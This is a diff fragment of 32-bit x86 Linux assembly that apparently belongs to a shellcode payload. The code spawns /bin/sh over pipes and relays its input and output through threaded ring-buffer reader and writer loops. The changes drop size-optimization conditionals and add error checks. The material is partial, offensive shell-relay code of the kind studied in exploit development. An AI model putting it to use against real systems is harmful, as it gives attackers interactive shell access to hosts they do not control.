@@ -118,7 +118,7 @@ child:
 
 	cmp	eax,ecx
 	jne	leave_sh_interleaved
-%ifndef OPTIMIZE_FOR_SIZE_HARD
+
 	; dup2(sh2m[1], 2)   (dup to stderr)
 	xor	eax,eax
 	mov	al,63
@@ -128,7 +128,6 @@ child:
 
 	cmp	eax,ecx
 	jne	leave_sh_interleaved
-%endif
 
 	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
 	xor	eax,eax
@@ -157,7 +156,6 @@ parent:
 	; remember child's PID
 	mov	[ebp+child_pid],eax
 
-%ifndef OPTIMIZE_FOR_SIZE_HARD
 	; close(m2sh[0])
 	xor	eax,eax
 	mov	al,6
@@ -169,7 +167,6 @@ parent:
 	mov	al,6
 	mov	ebx,[ebp+sh2m_1]
 	int	0x80
-%endif
 
 	; clone:
 	; one thread for reader, one thread for writer
@@ -234,8 +231,17 @@ reader_while_fds_ok:
 	inc	edx			; EDX := 1
 	int	0x80
 
-	; mark chunk as read
-	add	[ebp+rfrm_reader_pos], dl
+	xor	ebx,ebx
+	inc	ebx
+	cmp	eax,ebx
+	je	reader_write_to_child_ok
+
+	mov byte [ebp+to_child_ok], 0
+	jmp	reader_while_fds_ok
+
+reader_write_to_child_ok:
+	; mark byte as read:
+	inc byte [ebp+rfrm_reader_pos]
 	jmp	reader_while_fds_ok
 
 leave_sh_second_interleaved:
@@ -292,6 +298,15 @@ writer_while_fds_ok:
 	inc	edx
 	int	0x80
 
+	xor	ebx,ebx
+	inc	ebx
+	cmp	eax,ebx
+	je	writer_read_from_child_ok
+
+	mov byte [ebp+from_child_ok],0
+	jmp	writer_while_fds_ok
+
+writer_read_from_child_ok:
 	inc byte [ebp+rto_writer_pos]
 
 	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
